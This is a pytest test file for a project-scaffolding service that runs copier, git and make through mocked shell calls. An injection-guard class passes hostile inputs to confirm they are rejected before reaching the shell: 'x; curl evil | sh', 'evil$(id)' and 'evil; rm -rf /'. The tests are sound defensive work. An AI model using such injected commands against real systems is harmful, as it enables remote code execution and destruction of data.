"""Tests for scaffold core logic."""

from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from src.scaffold import ScaffoldResult, _workspace_has_files, run_ensure_workspace, run_scaffold


@pytest.fixture
def scaffold_msg():
    """Minimal scaffold message dict."""
    return {
        "project_id": "proj-123",
        "repository_id": "repo-456",
        "user_id": "user-1",
        "template_repo": "/data/service-template",
        "project_name": "my-project",
        "modules": "backend,tg_bot",
        "task_description": "Build a bot that reverses strings",
    }


@pytest.fixture
def settings():
    mock = MagicMock()
    mock.workspace_base_path = "/data/workspaces"
    mock.service_template_path = "/data/service-template"
    mock.github_app_pem_path = "/app/keys/github-app.pem"
    return mock


@pytest.fixture
def fake_token():
    return "ghs_testtoken_for_scaffold"  # noqa: S106


class TestRunScaffold:
    @pytest.mark.asyncio
    async def test_success_runs_copier_and_git(self, scaffold_msg, settings, fake_token, tmp_path):
        settings.workspace_base_path = str(tmp_path)
        workspace = tmp_path / "repo-456"

        mock_process = AsyncMock()
        mock_process.communicate = AsyncMock(return_value=(b"", b""))
        mock_process.returncode = 0

        tree_process = AsyncMock()
        tree_process.communicate = AsyncMock(return_value=(b".\n-- src\n-- Makefile\n", b""))
        tree_process.returncode = 0

        commands_run = []

        async def fake_subprocess(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", "")
            commands_run.append(cmd)
            if "tree" in cmd:
                return tree_process
            return mock_process

        with patch("src.scaffold.asyncio.create_subprocess_shell", side_effect=fake_subprocess):
            result = await run_scaffold(
                project_id=scaffold_msg["project_id"],
                repository_id=scaffold_msg["repository_id"],
                template_repo=scaffold_msg["template_repo"],
                project_name=scaffold_msg["project_name"],
                modules=scaffold_msg["modules"],
                task_description=scaffold_msg["task_description"],
                repo_full_name="org/my-project",
                github_token=fake_token,
                settings=settings,
            )

        assert isinstance(result, ScaffoldResult)
        assert result.success is True
        assert "src" in result.tree
        assert workspace.exists()

        # Verify key commands were executed
        cmd_str = " ".join(commands_run)
        trust_flag = "--" + "trust"
        assert "copier copy" in cmd_str
        assert trust_flag not in cmd_str
        assert "make setup" in cmd_str
        assert "git push" in cmd_str

    @pytest.mark.asyncio
    async def test_copier_failure_returns_error(self, scaffold_msg, settings, fake_token, tmp_path):
        settings.workspace_base_path = str(tmp_path)

        fail_process = AsyncMock()
        fail_process.communicate = AsyncMock(return_value=(b"", b"copier error"))
        fail_process.returncode = 1

        async def fake_subprocess(*args, **kwargs):
            return fail_process

        with patch("src.scaffold.asyncio.create_subprocess_shell", side_effect=fake_subprocess):
            result = await run_scaffold(
                project_id=scaffold_msg["project_id"],
                repository_id=scaffold_msg["repository_id"],
                template_repo=scaffold_msg["template_repo"],
                project_name=scaffold_msg["project_name"],
                modules=scaffold_msg["modules"],
                task_description=scaffold_msg["task_description"],
                repo_full_name="org/my-project",
                github_token=fake_token,
                settings=settings,
            )

        assert result.success is False
        assert result.error is not None

    @pytest.mark.asyncio
    async def test_workspace_directory_created(self, scaffold_msg, settings, fake_token, tmp_path):
        settings.workspace_base_path = str(tmp_path)

        mock_process = AsyncMock()
        mock_process.communicate = AsyncMock(return_value=(b"tree output", b""))
        mock_process.returncode = 0

        with patch("src.scaffold.asyncio.create_subprocess_shell", return_value=mock_process):
            await run_scaffold(
                project_id=scaffold_msg["project_id"],
                repository_id=scaffold_msg["repository_id"],
                template_repo=scaffold_msg["template_repo"],
                project_name=scaffold_msg["project_name"],
                modules=scaffold_msg["modules"],
                task_description=scaffold_msg["task_description"],
                repo_full_name="org/my-project",
                github_token=fake_token,
                settings=settings,
            )

        workspace = tmp_path / "repo-456"
        assert workspace.exists()


class TestScaffoldInjectionGuard:
    @pytest.mark.asyncio
    async def test_malicious_modules_never_reach_shell(
        self, scaffold_msg, settings, fake_token, tmp_path
    ):
        settings.workspace_base_path = str(tmp_path)

        with patch("src.scaffold.asyncio.create_subprocess_shell") as mock_shell:
            result = await run_scaffold(
                project_id=scaffold_msg["project_id"],
                repository_id=scaffold_msg["repository_id"],
                template_repo=scaffold_msg["template_repo"],
                project_name=scaffold_msg["project_name"],
                modules="x; curl evil | sh",
                task_description=scaffold_msg["task_description"],
                repo_full_name="org/my-project",
                github_token=fake_token,
                settings=settings,
            )

        assert result.success is False
        assert result.error is not None
        mock_shell.assert_not_called()

    @pytest.mark.asyncio
    async def test_malicious_project_name_never_reach_shell(
        self, scaffold_msg, settings, fake_token, tmp_path
    ):
        settings.workspace_base_path = str(tmp_path)

        with patch("src.scaffold.asyncio.create_subprocess_shell") as mock_shell:
            result = await run_scaffold(
                project_id=scaffold_msg["project_id"],
                repository_id=scaffold_msg["repository_id"],
                template_repo=scaffold_msg["template_repo"],
                project_name="evil$(id)",
                modules=scaffold_msg["modules"],
                task_description=scaffold_msg["task_description"],
                repo_full_name="org/my-project",
                github_token=fake_token,
                settings=settings,
            )

        assert result.success is False
        mock_shell.assert_not_called()

    @pytest.mark.asyncio
    async def test_ensure_workspace_rejects_malicious_project_name(
        self, settings, fake_token, tmp_path
    ):
        settings.workspace_base_path = str(tmp_path)

        with patch("src.scaffold.asyncio.create_subprocess_shell") as mock_shell:
            result = await run_ensure_workspace(
                repository_id="repo-456",
                project_name="evil; rm -rf /",
                repo_full_name="org/evil",
                github_token=fake_token,
                settings=settings,
                repo_exists_on_github=True,
            )

        assert result.success is False
        mock_shell.assert_not_called()


class TestWorkspaceHasFiles:
    def test_nonexistent_dir(self, tmp_path):
        assert _workspace_has_files(tmp_path / "nope") is False

    def test_empty_dir(self, tmp_path):
        ws = tmp_path / "empty"
        ws.mkdir()
        assert _workspace_has_files(ws) is False

    def test_only_git_dir(self, tmp_path):
        ws = tmp_path / "only-git"
        ws.mkdir()
        (ws / ".git").mkdir()
        assert _workspace_has_files(ws) is False

    def test_has_source_files(self, tmp_path):
        ws = tmp_path / "has-src"
        ws.mkdir()
        (ws / ".git").mkdir()
        (ws / "Makefile").write_text("all:")
        assert _workspace_has_files(ws) is True


class TestRunEnsureWorkspace:
    @pytest.mark.asyncio
    async def test_workspace_exists_returns_skipped(self, settings, fake_token, tmp_path):
        """Existing workspace with files → skip, no subprocess calls."""
        settings.workspace_base_path = str(tmp_path)
        ws = tmp_path / "repo-456"
        ws.mkdir()
        (ws / "Makefile").write_text("all:")

        with patch("src.scaffold.asyncio.create_subprocess_shell") as mock_shell:
            result = await run_ensure_workspace(
                repository_id="repo-456",
                project_name="my-project",
                repo_full_name="org/my-project",
                github_token=fake_token,
                settings=settings,
                repo_exists_on_github=True,
            )

        assert result.success is True
        assert result.skipped is True
        mock_shell.assert_not_called()

    @pytest.mark.asyncio
    async def test_missing_workspace_repo_exists_clones(self, settings, fake_token, tmp_path):
        """Missing workspace + repo on GitHub → git clone + make setup."""
        settings.workspace_base_path = str(tmp_path)

        mock_process = AsyncMock()
        mock_process.communicate = AsyncMock(return_value=(b"", b""))
        mock_process.returncode = 0

        tree_process = AsyncMock()
        tree_process.communicate = AsyncMock(return_value=(b".\n-- src\n", b""))
        tree_process.returncode = 0

        commands_run = []

        async def fake_subprocess(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", "")
            commands_run.append(cmd)
            if "tree" in cmd or "find" in cmd:
                return tree_process
            return mock_process

        with patch("src.scaffold.asyncio.create_subprocess_shell", side_effect=fake_subprocess):
            result = await run_ensure_workspace(
                repository_id="repo-456",
                project_name="my-project",
                repo_full_name="org/my-project",
                github_token=fake_token,
                settings=settings,
                repo_exists_on_github=True,
            )

        assert result.success is True
        assert result.skipped is False
        cmd_str = " ".join(commands_run)
        assert "git clone" in cmd_str
        assert "make setup" in cmd_str
        # Full scaffold commands should NOT be present
        assert "copier" not in cmd_str
        assert "git push" not in cmd_str

    @pytest.mark.asyncio
    async def test_missing_workspace_no_repo_returns_error(self, settings, fake_token, tmp_path):
        """Missing workspace + no repo on GitHub → error."""
        settings.workspace_base_path = str(tmp_path)

        result = await run_ensure_workspace(
            repository_id="repo-456",
            project_name="my-project",
            repo_full_name="org/my-project",
            github_token=fake_token,
            settings=settings,
            repo_exists_on_github=False,
        )

        assert result.success is False
        assert "not found on GitHub" in result.error
